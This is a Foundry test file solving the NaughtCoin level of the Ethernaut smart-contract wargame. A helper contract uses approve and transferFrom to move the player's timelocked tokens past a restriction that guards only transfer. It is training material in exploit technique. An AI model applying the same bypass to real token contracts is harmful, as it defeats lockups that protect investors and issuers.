// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "forge-std/Test.sol";

import "../levels/15-NaughtCoin/NaughtCoinFactory.sol";
import "../core/Ethernaut.sol";

contract NaughtCoinTest is Test {
    Ethernaut ethernaut;
    address attacker = makeAddr("attacker");

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether);
    }

    function testNaughtCoinHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        NaughtCoinFactory naughtCoinFactory = new NaughtCoinFactory();
        ethernaut.registerLevel(naughtCoinFactory);
        vm.startPrank(attacker, attacker); // origin has its importance in this challenge
        address levelAddress = ethernaut.createLevelInstance(naughtCoinFactory);
        NaughtCoin ethernautNaughtCoin = NaughtCoin(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // It is not possible to transfer coins as the player (attacker) until the timelock is over
        // But it is possible to approve an address to spend the coin on the behalf of the player
        // with approve. With transferFrom called from approved address, it will transfer a specified amount
        // from sender to recipient.
        NaughtCoinHacker naughtCoinHacker = new NaughtCoinHacker(ethernautNaughtCoin, attacker);
        uint256 balanceAttacker = ethernautNaughtCoin.balanceOf(attacker);

        ethernautNaughtCoin.approve(address(naughtCoinHacker), balanceAttacker);

        address newAddress = makeAddr("newAddress"); // should be on the managable by the attacker
        naughtCoinHacker.unlock(balanceAttacker, newAddress);

        assertEq(ethernautNaughtCoin.balanceOf(newAddress), balanceAttacker);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract NaughtCoinHacker {
    NaughtCoin naughtCoin;
    address attacker;

    constructor(NaughtCoin _naughtCoin, address _attacker) {
        require(address(_naughtCoin).code.length > 0, "Not a contract");
        naughtCoin = _naughtCoin;
        attacker = _attacker;
    }

    function unlock(uint256 amount, address newAddress) external {
        naughtCoin.transferFrom(attacker, newAddress, amount);
    }
}
